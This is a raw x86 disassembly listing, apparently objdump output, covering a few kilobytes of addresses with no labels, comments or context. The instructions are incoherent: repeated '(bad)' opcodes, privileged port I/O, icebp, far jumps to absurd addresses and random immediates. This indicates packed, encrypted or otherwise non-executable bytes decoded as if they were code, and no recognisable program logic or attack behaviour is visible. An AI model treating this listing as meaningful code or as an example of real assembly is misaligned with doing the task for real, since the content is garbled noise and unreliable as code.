  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	dec    ebp
  415eef:	outs   dx,DWORD PTR ds:[esi]
  415ef0:	ret    0xcd2c
  415ef3:	inc    eax
  415ef4:	xor    al,0x43
  415ef6:	ins    BYTE PTR es:[edi],dx
  415ef7:	das    
  415ef8:	or     eax,0xfb0a1815
  415efd:	in     al,0x79
  415eff:	jbe    0x415f6c
  415f01:	xor    DWORD PTR [ecx],edx
  415f03:	test   al,0x4d
  415f05:	sub    ebp,DWORD PTR ds:0x50903b57
  415f0b:	repnz push edi
  415f0d:	jge    0x415f79
  415f0f:	mov    cl,0xcc
  415f11:	in     eax,dx
  415f12:	scas   al,BYTE PTR es:[edi]
  415f13:	dec    esi
  415f14:	mov    dh,0x93
  415f16:	inc    esi
  415f17:	and    DWORD PTR [ebx+esi*2],eax
  415f1a:	pop    esi
  415f1b:	daa    
  415f1c:	and    eax,0xbaa67387
  415f21:	imul   ebx,ebp,0xffffffa0
  415f24:	sbb    DWORD PTR [edx+eiz*4],ebp
  415f27:	sub    ch,BYTE PTR [edi+0x66]
  415f2a:	retf   
  415f2b:	sbb    edx,DWORD PTR [ebx-0x4e]
  415f2e:	dec    ebp
  415f2f:	pop    ss
  415f30:	clc    
  415f31:	jecxz  0x415f95
  415f33:	hlt    
  415f34:	mov    bl,0xa3
  415f36:	pop    esi
  415f37:	jb     0x415f70
  415f39:	and    BYTE PTR [ebx+0x6],bh
  415f3c:	not    DWORD PTR [edi-0x3]
  415f3f:	sub    dh,cl
  415f41:	jb     0x415f59
  415f43:	fs push esi
  415f45:	jg     0x415f8d
  415f47:	pop    ebx
  415f48:	push   0xffffffad
  415f4a:	add    BYTE PTR [edx-0x528cdc70],ch
  415f50:	test   DWORD PTR [ebx+0x7a],esi
  415f53:	cdq    
  415f54:	add    al,BYTE PTR [ebx]
  415f56:	dec    esp
  415f57:	push   ebp
  415f58:	cmovns ecx,DWORD PTR [esi]
  415f5b:	pop    edx
  415f5c:	dec    eax
  415f5d:	adc    edx,ecx
  415f5f:	rol    ebp,cl
  415f61:	mov    ah,0x89
  415f63:	sti    
  415f64:	push   ss
  415f65:	jle    0x415f15
  415f67:	xor    ebp,ebp
  415f69:	loopne 0x415f63
  415f6b:	dec    ecx
  415f6c:	pushf  
  415f6d:	adc    edx,DWORD PTR [esi+eax*2]
  415f70:	and    al,0x13
  415f72:	stos   DWORD PTR es:[edi],eax
  415f73:	xchg   ebp,eax
  415f74:	in     al,dx
  415f75:	je     0x415fb1
  415f77:	mov    eax,0x7b83f0b5
  415f7c:	jge    0x415f5f
  415f7e:	push   eax
  415f7f:	cwde   
  415f80:	ds retf 
  415f82:	icebp  
  415f83:	test   DWORD PTR [edi],eax
  415f85:	xchg   ebx,eax
  415f86:	mov    ch,0xd7
  415f88:	fscale 
  415f8a:	dec    ecx
  415f8b:	jae    0x415f71
  415f8d:	(bad)  
  415f8e:	in     eax,0x6
  415f90:	sar    edx,0xa8
  415f93:	pop    sp
  415f95:	adc    ch,BYTE PTR [eax+0x3b]
  415f98:	push   es
  415f99:	adc    cl,BYTE PTR [ecx]
  415f9b:	ficomp DWORD PTR [esp+esi*1+0x57ac944a]
  415fa2:	cmp    bh,dh
  415fa4:	out    0xfb,al
  415fa6:	enter  0xf4da,0x76
  415faa:	and    al,0xc9
  415fac:	cwde   
  415fad:	enter  0x5264,0x3c
  415fb1:	add    al,0x77
  415fb3:	cld    
  415fb4:	stos   BYTE PTR es:[edi],al
  415fb5:	popf   
  415fb6:	sbb    edi,0x78
  415fb9:	aas    
  415fba:	and    edx,DWORD PTR [edx-0x6]
  415fbd:	cli    
  415fbe:	jmp    0x1f3882f9
  415fc3:	jg     0x415f97
  415fc5:	sub    ecx,DWORD PTR [ebx+0x75105f1f]
  415fcb:	gs dec esi
  415fcd:	(bad)  
  415fcf:	mov    WORD PTR [ebx],es
  415fd1:	out    dx,eax
  415fd2:	cmp    DWORD PTR [ebx+esi*8+0x1ae66496],esi
  415fd9:	fisttp QWORD PTR [edi]
  415fdb:	jo     0x415fd3
  415fdd:	aam    0xd7
  415fdf:	inc    eax
  415fe0:	fwait
  415fe1:	mov    ecx,0x94cc88d7
  415fe6:	pusha  
  415fe7:	es adc ch,cl
  415fea:	dec    eax
  415feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fec:	pop    esi
  415fed:	adc    al,BYTE PTR [eax]
	...
  416053:	add    BYTE PTR [eax],al
  416055:	add    BYTE PTR [edi],dl
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	das    
  416063:	lahf   
  416064:	popf   
  416065:	push   ebp
  416066:	addr16 in eax,dx
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	cs (bad) 
  416070:	mov    BYTE PTR [edx],al
  416072:	pop    ebx
  416073:	repnz imul eax,ebp,0xdbc327a7
  41607a:	pop    edx
  41607b:	fild   QWORD PTR [ebp+0x33]
  41607e:	aad    0x0
  416080:	loop   0x416018
  416082:	rcr    BYTE PTR [ebp+0x7b80ee38],cl
  416088:	sub    eax,0x4fa19e32
  41608d:	adc    al,0x46
  41608f:	xchg   ebp,eax
  416090:	shr    BYTE PTR [ecx-0x4580d37a],0xb6
  416097:	adc    al,0xbc
  416099:	mov    esi,0x76523c98
  41609e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41609f:	adc    eax,0x48d0c7
  4160a4:	sbb    cl,cl
  4160a6:	adc    al,0x34
  4160a8:	fld    QWORD PTR [ebx]
  4160aa:	rcr    DWORD PTR [esi],0x9a
  4160ad:	xor    ah,BYTE PTR [esi]
  4160af:	mov    edi,0x912100a8
  4160b4:	dec    esi
  4160b5:	(bad)  
  4160b6:	das    
  4160b7:	leave  
  4160b8:	xor    al,0xc4
  4160ba:	into   
  4160bb:	(bad)  
  4160bc:	push   0xcd5427e1
  4160c1:	mov    ebx,0x6ab37c57
  4160c6:	sub    ecx,eax
  4160c8:	adc    al,0xac
  4160ca:	in     al,0x70
  4160cc:	push   esi
  4160cd:	xor    ecx,edx
  4160cf:	mov    cl,0x1a
  4160d1:	mov    cl,0x76
  4160d3:	fldenv [edx+0x71]
  4160d6:	add    eax,0xcd4d7cce
  4160db:	fisubr WORD PTR [ecx+edx*8+0x7d5aa2d0]
  4160e2:	push   DWORD PTR [edi]
  4160e4:	outs   dx,DWORD PTR ds:[esi]
  4160e5:	pop    eax
  4160e6:	or     DWORD PTR [eax+0x1c],eax
  4160e9:	pop    edi
  4160ea:	sbb    BYTE PTR [ecx+0xc],ah
  4160ed:	fild   WORD PTR [eax-0x35134b07]
  4160f3:	xchg   esp,eax
  4160f4:	cmp    ch,al
  4160f6:	and    DWORD PTR [eax],0x6e51ffbd
  4160fc:	and    al,bh
  4160fe:	xchg   edi,eax
  4160ff:	mov    esi,0xc4ccc645
  416104:	test   bh,ch
  416106:	dec    ebx
  416107:	mov    DWORD PTR [edi-0x39eaf3cd],0x1bf19869
  416111:	outs   dx,DWORD PTR ds:[esi]
  416112:	mov    al,0x9d
  416114:	ss das 
  416116:	dec    ebp
  416117:	rcl    DWORD PTR [eax-0xf],0xba
  41611b:	push   ss
  41611c:	inc    di
  41611e:	pusha  
  41611f:	fnstenv [esi+esi*1-0xa]
  416123:	(bad)  
  416124:	mov    ch,0x7b
  416126:	adc    ah,BYTE PTR [esi+0x73]
  416129:	imul   DWORD PTR [ebx+0x5e]
  41612c:	sbb    bh,BYTE PTR [ebx]
  41612e:	push   esp
  41612f:	jle    0x4160bb
  416131:	in     al,0xaf
  416133:	cmp    eax,DWORD PTR [edi-0x42]
  416136:	sub    al,0xdd
  416138:	mov    DWORD PTR ds:0xce6eaf68,eax
  41613e:	and    al,0x78
  416140:	inc    edi
  416141:	mov    bh,0x9f
  416143:	lahf   
  416144:	xchg   BYTE PTR [edx+0x486646e3],al
  41614a:	repz and ebp,DWORD PTR [edx-0x7d042567]
  416151:	(bad)
  416154:	call   0xa6d47b1c
  416159:	mov    esi,0x986724e0
  41615e:	xor    al,0xab
  416160:	mov    WORD PTR [edx],fs
  416162:	bound  edi,QWORD PTR [edi+0x16]
  416165:	mov    dh,0x8e
  416167:	arpl   dx,di
  416169:	jecxz  0x41613e
  41616b:	and    eax,0x13f4
	...
  4161d4:	add    BYTE PTR [eax],al
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0xdfc523f3
  4161e5:	adc    DWORD PTR [edi-0x12],esp
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	cmp    edx,DWORD PTR [ebx+esi*2]
  4161f1:	xchg   esp,eax
  4161f2:	and    al,0xc0
  4161f4:	inc    edi
  4161f5:	jp     0x416268
  4161f7:	test   DWORD PTR [ecx+0x4],0xe0186ad1
  4161fe:	int3   
  4161ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416200:	and    eax,0x4e34bbe2
  416205:	jae    0x41625c
  416207:	pop    ebp
  416208:	jbe    0x41621c
  41620a:	ret    
  41620b:	xlat   BYTE PTR ds:[ebx]
  41620c:	das    
  41620d:	cmc    
  41620e:	ret    
  41620f:	shl    bh,cl
  416211:	mov    dh,0x3b
  416213:	imul   esi,edi,0x17fb04b6
  416219:	enter  0x6f,0x4e
  41621d:	outs   dx,DWORD PTR ds:[esi]
  41621e:	mov    dh,0x45
  416220:	and    eax,0x6a133052
  416225:	push   es
  416226:	and    ebp,ebp
  416228:	jle    0x41621f
  41622a:	cwde   
  41622b:	iret   
  41622c:	inc    esp
  41622d:	cmp    al,0x85
  41622f:	sub    DWORD PTR [ecx-0x50],ebx
  416232:	mov    dl,0xc6
  416234:	cmp    eax,0xac644709
  416239:	mov    ch,0xfa
  41623b:	xchg   ebp,eax
  41623c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41623d:	cmp    esi,edi
  41623f:	push   ss
  416240:	add    DWORD PTR [edx+0x1],esi
  416243:	inc    edx
  416244:	or     eax,DWORD PTR [ebx+0x2f09fb9d]
  41624a:	shl    BYTE PTR [ecx-0x6f2f5843],0x7e
  416251:	out    0x1e,al
  416253:	das    
  416254:	adc    ebx,DWORD PTR [eax]
  416256:	sub    ecx,0xffffff97
  416259:	les    edi,FWORD PTR [edx+0x32]
  41625c:	xor    al,0x65
  41625e:	sub    ch,dh
  416260:	stos   BYTE PTR es:[edi],al
  416261:	xor    DWORD PTR [esi+0x35],0xffffff92
  416265:	call   0xccbc4fd1
  41626a:	mov    al,0xd2
  41626c:	por    mm4,QWORD PTR [edx*8+0x24a4d6f5]
  416274:	pop    ss
  416275:	push   0xffffff99
  416277:	push   ecx
  416278:	xchg   BYTE PTR [edx],ah
  41627a:	or     DWORD PTR [edx],eax
  41627c:	cmp    esi,DWORD PTR [ebx+esi*4]
  41627f:	pop    ecx
  416280:	sub    esp,edx
  416282:	sar    cl,0x7a
  416285:	mov    eax,0x8279f0d6
  41628a:	xchg   ebp,eax
  41628b:	xor    eax,0x5d3ca1a
  416290:	inc    ebp
  416291:	xchg   edi,eax
  416292:	pop    ds
  416293:	cs pop edx
  416295:	mov    al,0xa4
  416297:	mov    esi,0xb35dd8e3
  41629c:	jl     0x416293
  41629e:	xchg   ebx,eax
  41629f:	and    dl,BYTE PTR [ecx]
  4162a1:	mov    bh,0x2f
  4162a3:	jmp    FWORD PTR [eax+0x2a]
  4162a6:	xlat   BYTE PTR ds:[ebx]
  4162a7:	and    DWORD PTR [ebp+0x278e784a],esp
  4162ad:	sbb    edi,DWORD PTR [esi+0x73685677]
  4162b3:	ss xor al,0xaf
  4162b6:	mov    ecx,0xc38eac4f
  4162bb:	mov    bl,0x3d
  4162bd:	xor    eax,0xfb57ac12
  4162c2:	fwait
  4162c3:	aam    0x1b
  4162c5:	mov    bh,0xe2
  4162c7:	into   
  4162c8:	jl     0x416277
  4162ca:	addr16 gs jnp 0x4162b5
  4162ce:	adc    DWORD PTR [ebx],eax
  4162d0:	fstp   QWORD PTR [edx-0x45fd8c2]
  4162d6:	inc    esi
  4162d7:	arpl   cx,ax
  4162d9:	idiv   DWORD PTR [edi+eax*4+0x47]
  4162dd:	push   es
  4162de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162df:	jo     0x4162bd
  4162e1:	inc    edx
  4162e2:	inc    esi
  4162e4:	sbb    BYTE PTR [edi],bh
  4162e6:	mov    DWORD PTR [edx+0x1b],esi
  4162e9:	lods   eax,DWORD PTR ds:[esi]
  4162ea:	cdq    
  4162eb:	mov    esp,DWORD PTR [esi]
  4162ed:	mov    bl,0x0
	...
  416353:	add    BYTE PTR [eax],al
  416355:	add    BYTE PTR [ebx],ah
  416357:	outs   dx,BYTE PTR ds:[esi]
  416358:	xor    ah,BYTE PTR ds:0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x6777:0x2af47bee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	aaa    
  41636f:	aas    
  416370:	shr    DWORD PTR [ecx-0x45],0x17
  416374:	inc    edx
  416375:	push   cs
  416376:	gs mov bh,0x4b
  416379:	push   0xfffffff7
  41637b:	dec    esi
  41637c:	pop    ebx
  41637d:	sbb    DWORD PTR [edx],edi
  41637f:	retf   0xaa69
  416382:	sub    bl,ah
  416384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416385:	mov    ebp,0x86346c35
  41638a:	and    DWORD PTR [edx],0x2d02b485
  416390:	pushf  
  416391:	add    cl,0xad
  416394:	rcl    BYTE PTR [ebx+edi*4+0x706afef4],cl
  41639b:	xchg   DWORD PTR [ecx-0x952be7d],ebp
  4163a1:	out    0xd8,al
  4163a3:	pop    ecx
  4163a4:	std    
  4163a5:	dec    edx
  4163a6:	push   0x2e4b6dac
  4163ab:	imul   cl
  4163ad:	rcl    DWORD PTR [esi+0x37],1
  4163b0:	cmp    cl,BYTE PTR [esi-0x79]
  4163b3:	xor    al,0x5a
  4163b5:	retf   
  4163b6:	fwait
  4163b7:	xor    al,0x19
  4163b9:	xor    al,0xe3
  4163bb:	shr    BYTE PTR [ebx-0x2c],1
  4163be:	lea    esi,[edi+ebx*8-0x68]
  4163c2:	xchg   edx,eax
  4163c3:	outs   dx,BYTE PTR ds:[esi]
  4163c4:	cld    
  4163c5:	pop    edi
  4163c6:	(bad)  
  4163c7:	push   DWORD PTR [ecx]
  4163c9:	adc    ebx,0x7c
  4163cc:	mov    eax,0x39886947
  4163d1:	scas   eax,DWORD PTR es:[edi]
  4163d2:	lahf   
  4163d3:	xor    ah,al
  4163d5:	inc    ecx
  4163d6:	jg     0x41642e
  4163d8:	cdq    
  4163d9:	and    eax,0x213f885
  4163de:	pop    ss
  4163df:	xor    ecx,ebx
  4163e1:	enter  0x12dc,0x14
  4163e5:	jb     0x41637a
  4163e7:	mov    bl,0xb
  4163e9:	and    al,0x45
  4163eb:	mov    edi,0xeebeb910
  4163f0:	pop    ss
  4163f1:	icebp  
  4163f2:	pop    esp
  4163f3:	pop    ds
  4163f4:	push   0xffffff84
  4163f6:	sti    
  4163f7:	jno    0x41639c
  4163f9:	xchg   ebp,eax
  4163fa:	lods   al,BYTE PTR ds:[esi]
  4163fb:	out    dx,al
  4163fc:	scas   eax,DWORD PTR es:[edi]
  4163fd:	cmp    bh,dl
  4163ff:	inc    eax
  416400:	clc    
  416401:	cld    
  416402:	xchg   esp,eax
  416403:	clc    
  416404:	pop    ecx
  416405:	into   
  416406:	ins    DWORD PTR es:[edi],dx
  416407:	jae    0x416447
  416409:	jbe    0x416421
  41640b:	jbe    0x4163e1
  41640d:	jo     0x4163a9
  41640f:	push   edx
  416410:	add    dh,BYTE PTR [eax-0x52]
  416413:	inc    ecx
  416414:	(bad)  
  416415:	loope  0x416401
  416417:	jno    0x41639c
  416419:	ds push cs
  41641b:	out    0xdb,eax
  41641d:	push   edx
  41641e:	cmp    esp,ecx
  416420:	fnstcw WORD PTR [edx-0x12]
  416423:	loope  0x41649c
  416425:	mov    gs,WORD PTR [edx]
  416427:	sbb    esi,0x15
  41642a:	sub    al,0xd6
  41642c:	sub    eax,0x76adfde4
  416431:	(bad)  
  416432:	pop    ebx
  416433:	add    DWORD PTR [esi-0x6edd437c],ecx
  416439:	fldenv [ebx-0x3e]
  41643c:	stc    
  41643d:	(bad)  
  41643e:	sbb    al,0xc8
  416440:	sub    eax,0x53cf78fa
  416445:	je     0x4164af
  416447:	lea    esp,[esi+0x9b7d7c4]
  41644d:	pop    esi
  41644e:	push   DWORD PTR [esp+eax*8-0x1e6e2b73]
  416455:	push   esp
  416456:	mov    edi,0x2ea22508
  41645b:	shl    BYTE PTR [ebx],0x3b
  41645e:	pop    ebp
  41645f:	lea    esp,[ebx+0x3d]
  416462:	mov    ebp,0xe412bb0f
  416467:	neg    ecx
  416469:	adc    BYTE PTR [ecx],dh
  41646b:	sahf   
  41646c:	std    
  41646d:	rol    BYTE PTR [eax],cl
	...
  4164d3:	add    BYTE PTR [eax],al
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	or     eax,0x67b7761c
  4164e7:	lock add BYTE PTR [eax],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	inc    edi
  4164ef:	fsubr  DWORD PTR [eax+0x62]
  4164f2:	addr16 mov esi,0x26cd30f2
  4164f8:	dec    esi
  4164f9:	sub    bl,BYTE PTR [ebp-0x18d3e508]
  4164ff:	enter  0xa3ec,0x14
  416503:	push   ebp
  416504:	mov    esp,0x3acb6a10
  416509:	cs push esp
  41650b:	fdiv   st,st(0)
  41650d:	ins    DWORD PTR es:[edi],dx
  41650e:	adc    al,0xd7
  416510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416511:	adc    ah,BYTE PTR [ebp-0x7c7e6207]
  416517:	das    
  416518:	or     DWORD PTR [edx],ebx
  41651a:	in     al,0xc4
  41651c:	(bad)  
  41651d:	(bad)  
  41651e:	fcomp  QWORD PTR [ecx-0x63]
  416521:	sub    esi,ebp
  416523:	test   DWORD PTR [ecx+0x1dd447a1],esp
  416529:	sbb    DWORD PTR [esi],eax
  41652b:	mov    edx,0xab870f56
  416530:	es popf 
  416532:	jae    0x4164e3
  416534:	jecxz  0x416504
  416536:	add    al,0x74
  416538:	cmp    eax,DWORD PTR [edx-0x6c9220e4]
  41653e:	mov    ds:0x533c7437,eax
  416543:	push   ss
  416544:	mov    bl,0xdc
  416546:	pop    es
  416547:	jmp    DWORD PTR ds:0x237324df
  41654d:	lahf   
  41654e:	gs int3 
  416550:	fsubr  DWORD PTR [edi+0x557269dd]
  416556:	cmp    eax,0x71dacb5e
  41655b:	sbb    esi,ecx
  41655d:	adc    bh,dh
  41655f:	out    dx,al
  416560:	test   DWORD PTR [eax],eax
  416562:	idiv   BYTE PTR [ebp+0x1e0d8068]
  416568:	add    esi,ebp
  41656a:	xor    eax,0x3c559acb
  41656f:	cmp    eax,DWORD PTR [eax+0x27]
  416572:	js     0x416544
  416574:	arpl   WORD PTR [ecx],sp
  416576:	push   es
  416577:	or     al,0xab
  416579:	and    dh,BYTE PTR [edi+0x41]
  41657c:	fdivr  st,st(7)
  41657e:	adc    al,0x45
  416580:	and    ebx,DWORD PTR [eax+0x4b]
  416583:	xchg   ebp,eax
  416584:	mov    ch,0xd7
  416586:	arpl   WORD PTR [ebx+edx*1],di
  416589:	dec    ebp
  41658a:	adc    DWORD PTR [ebx+eiz*8-0x59b0242b],ebp
  416591:	ret    
  416592:	in     eax,dx
  416593:	retf   
  416594:	cmp    dl,0x18
  416597:	gs test al,0x85
  41659a:	xchg   ecx,eax
  41659b:	js     0x416610
  41659d:	or     BYTE PTR [edi+0x53],ch
  4165a0:	ret    0xab74
  4165a3:	data16 ror bh,cl
  4165a6:	arpl   WORD PTR [edx],dx
  4165a8:	cmp    BYTE PTR ds:0xc2e82b0e,ch
  4165ae:	daa    
  4165af:	add    al,0x9d
  4165b1:	fldenv [ecx+0x5e61ed82]
  4165b7:	pop    ds
  4165b8:	fdivp  st(6),st
  4165ba:	push   ss
  4165bb:	inc    ecx
  4165bc:	sbb    eax,0xcb972289
  4165c1:	repnz push esi
  4165c3:	xor    dl,BYTE PTR [eax+0x48a33ab0]
  4165c9:	gs in  eax,0xfe
  4165cc:	cwde   
  4165cd:	ret    0x81e1
  4165d0:	lock or BYTE PTR ds:0x86d81c26,ch
  4165d7:	or     al,0xb6
  4165d9:	hlt    
  4165da:	pop    ss
  4165db:	retf   0x4fbc
  4165de:	and    DWORD PTR [edx+edx*2-0x4e],edx
  4165e2:	imul   esi,ecx,0x68
  4165e5:	cmp    ebx,esi
  4165e7:	out    dx,al
  4165e8:	xor    eax,0x4c96bf9c
  4165ed:	mov    edi,0x0
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x6db04354]
  416663:	sbb    ecx,DWORD PTR [ebx+0xf16720]
  416669:	add    BYTE PTR [eax],al
  41666b:	add    DWORD PTR [eax],eax
  41666d:	add    BYTE PTR [eax-0xd],ch
  416670:	mov    edx,0xb55730c8
  416675:	inc    ecx
  416676:	cmp    ebp,ebp
  416678:	stos   DWORD PTR es:[edi],eax
  416679:	jle    0x41664c
  41667b:	xchg   edx,eax
  41667c:	dec    ecx
  41667d:	mov    al,0x14
  41667f:	ds mov cl,0xbe
  416682:	sbb    cl,dl
  416684:	jle    0x4166fc
  416686:	test   BYTE PTR [ecx],dl
  416688:	jae    0x4166fc
  41668a:	mov    al,0x8d
  41668c:	inc    edx
  41668d:	cmp    cl,BYTE PTR [di-0x581d]
  416692:	stos   BYTE PTR es:[edi],al
  416693:	cwde   
  416694:	sub    bl,BYTE PTR [ebx+0xf]
  416697:	or     eax,0xa3a4dc37
  41669c:	pop    eax
  41669d:	pop    ecx
  41669e:	push   0x8bcaf7dc
  4166a3:	popf   
  4166a4:	dec    edx
  4166a5:	push   cs
  4166a6:	lods   al,BYTE PTR ds:[esi]
  4166a7:	int3   
  4166a8:	icebp  
  4166a9:	and    edi,DWORD PTR [ecx]
  4166ab:	fldenv [edx+0x3454f53e]
  4166b1:	fld    DWORD PTR [edx-0x40]
  4166b4:	mov    cl,0x69
  4166b6:	cwde   
  4166b7:	mov    ebp,DWORD PTR [ebx]
  4166b9:	jmp    0x8eb3b54
  4166be:	pop    edx
  4166bf:	int3   
  4166c0:	add    ebp,ecx
  4166c2:	and    DWORD PTR [edx],eax
  4166c4:	dec    ebx
  4166c5:	xchg   esi,eax
  4166c6:	jecxz  0x4166aa
  4166c8:	shr    DWORD PTR [edx+ebp*8-0x2e427bf6],1
  4166cf:	ror    BYTE PTR [esi-0x1f],1
  4166d2:	dec    edi
  4166d3:	ins    BYTE PTR es:[edi],dx
  4166d4:	imul   edi,DWORD PTR [eax-0x4f],0x74748300
  4166db:	ins    BYTE PTR es:[edi],dx
  4166dc:	or     eax,0xcc0876b7
  4166e1:	out    dx,al
  4166e2:	sbb    DWORD PTR [edx-0x6d],0xfffffffa
  4166e6:	ds push sp
  4166e9:	repnz loope 0x416689
  4166ec:	jmp    0x416712
  4166ee:	xchg   ebp,eax
  4166ef:	mov    al,ds:0x9651ee7
  4166f4:	jnp    0x4166c3
  4166f6:	sbb    BYTE PTR [ecx],ch
  4166f8:	cmp    dh,BYTE PTR [ecx+0x2f8d689d]
  4166fe:	rcl    DWORD PTR [edx+eax*4],0x63
  416702:	push   esp
  416703:	aad    0x78
  416705:	test   eax,0xec93b43a
  41670a:	mov    cl,0xb1
  41670c:	inc    eax
  41670d:	out    dx,al
  41670e:	adc    ebp,DWORD PTR [ebx+0x44237fb4]
  416714:	mov    ds:0x256f3156,al
  416719:	in     eax,0xc6
  41671b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41671c:	adc    BYTE PTR [edx],ah
  41671e:	jmp    0x4166ee
  416720:	or     dl,ah
  416722:	jbe    0x4166fa
  416724:	inc    esi
  416725:	cmp    dl,dh
  416727:	icebp  
  416728:	add    BYTE PTR [esp+edx*2-0x6d],dl
  41672c:	mov    esp,0x58e22b61
  416731:	push   0x6c
  416733:	in     al,dx
  416734:	mov    esp,DWORD PTR [edx]
  416736:	mov    es,WORD PTR ds:[eax+edi*8+0x62]
  41673b:	pop    esi
  41673c:	sub    dl,BYTE PTR [ebx+0x72]
  41673f:	xchg   edi,eax
  416740:	fs xchg edx,eax
  416742:	inc    esi
  416743:	push   0x4d
  416745:	jecxz  0x4166df
  416747:	outs   dx,DWORD PTR ds:[esi]
  416748:	(bad)  
  416749:	cli    
  41674a:	dec    eax
  41674b:	fsubr  st,st(3)
  41674d:	lods   al,BYTE PTR ds:[esi]
  41674e:	fstp   QWORD PTR [esi]
  416750:	xchg   ebx,eax
  416751:	dec    ebx
  416752:	adc    al,0x90
  416754:	push   ebp
  416755:	lods   al,BYTE PTR ds:[esi]
  416756:	jmp    0x41674f
  416758:	xchg   edx,eax
  416759:	mov    eax,0x9a6d4ac6
  41675e:	add    al,0x63
  416760:	pusha  
  416761:	adc    al,0x5e
  416763:	ja     0x41676e
  416765:	outs   dx,BYTE PTR ds:[esi]
  416766:	mov    ecx,0x299e30eb
  41676b:	addr16 loop 0x4167d2
	...
  4167d6:	(bad)  
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	shl    DWORD PTR [edx-0xd98398d],1
  4167e8:	add    BYTE PTR [eax],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	cmp    eax,0x33919b82
  4167f3:	enter  0x20f9,0x85
  4167f7:	int3   
  4167f8:	and    edi,DWORD PTR [ebx-0x1]
  4167fb:	adc    DWORD PTR [eax-0x3da3f917],0xffffff83
  416802:	inc    ebp
  416803:	fisttp DWORD PTR [ebx+edi*8+0x4011b2b2]
  41680a:	pop    esi
  41680b:	mov    edx,0x8109431f
  416810:	adc    DWORD PTR [eax+0x1514972f],ebp
  416816:	sbb    eax,0x5290f85
  41681b:	test   BYTE PTR [eax],ch
  41681d:	xchg   ebp,eax
  41681e:	loope  0x4167ac
  416820:	and    al,0x54
  416822:	adc    BYTE PTR ds:0x6b896b37,bl
  416828:	popa   
  416829:	icebp  
  41682a:	sub    BYTE PTR [ecx-0xdc130c8],al
  416830:	fimul  WORD PTR [edi-0x41519e16]
  416836:	sbb    DWORD PTR [ebx-0xb],ebp
  416839:	or     eax,0xd8e0de1e
  41683e:	idiv   bl
  416840:	loopne 0x416882
  416842:	sbb    al,0xf2
  416844:	in     eax,dx
  416845:	fimul  WORD PTR [ebx-0x16ea88e]
  41684b:	stc    
  41684c:	mov    esi,0xc75c975f
  416851:	ss enter 0xff63,0x10
  416856:	mov    DWORD PTR [ebx-0x5d1424b1],edi
  41685c:	jg     0x41687d
  41685e:	adc    edi,DWORD PTR [eax+0x5b43e102]
  416864:	inc    ebp
  416865:	sti    
  416866:	mov    ch,0xab
  416868:	and    eax,0xb968e29
  41686d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41686e:	jecxz  0x4168b9
  416870:	dec    ebx
  416871:	push   cs
  416872:	sahf   
  416873:	xchg   BYTE PTR [ebx+0x40],bl
  416876:	push   eax
  416877:	mov    edx,0x39d8b16a
  41687c:	xor    ebp,edx
  41687e:	add    BYTE PTR [ebx+0x11],bh
  416881:	dec    esi
  416882:	aaa    
  416883:	mov    ecx,0x12ae11a2
  416888:	arpl   WORD PTR [eax+esi*2-0x16777692],bp
  41688f:	jo     0x41683f
  416891:	push   0xdb85a8df
  416896:	add    esi,DWORD PTR ds:[edi+0xf]
  41689a:	jae    0x4168df
  41689c:	jmp    0x416864
  41689e:	adc    DWORD PTR [esi-0x72],ebp
  4168a1:	jmp    FWORD PTR [esi-0x68214cb1]
  4168a7:	mov    ebx,0xc06052e6
  4168ac:	fstp   TBYTE PTR [ecx+0x5e1cc1bd]
  4168b2:	js     0x416915
  4168b4:	sar    BYTE PTR [edx],1
  4168b6:	xor    edi,ecx
  4168b8:	in     al,dx
  4168b9:	inc    esi
  4168ba:	shr    BYTE PTR [ebp-0x56c0a0f2],0x70
  4168c1:	push   ds
  4168c2:	xchg   ebx,eax
  4168c3:	mov    al,0x17
  4168c5:	imul   eax,esp,0x980e786
  4168cb:	add    dl,dh
  4168cd:	adc    edx,esi
  4168cf:	cld    
  4168d0:	sbb    dh,BYTE PTR ds:0xb89d14b0
  4168d6:	sar    BYTE PTR [edi-0x17],cl
  4168d9:	adc    eax,0xb6d52dd3
  4168de:	ret    
  4168df:	and    eax,0xb7b36f6d
  4168e4:	xchg   esi,eax
  4168e5:	xchg   esi,eax
  4168e6:	es mov edi,0x9195d86e
  4168ec:	lds    ebp,FWORD PTR [edi+0x0]
	...
  416953:	add    BYTE PTR [eax],al
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
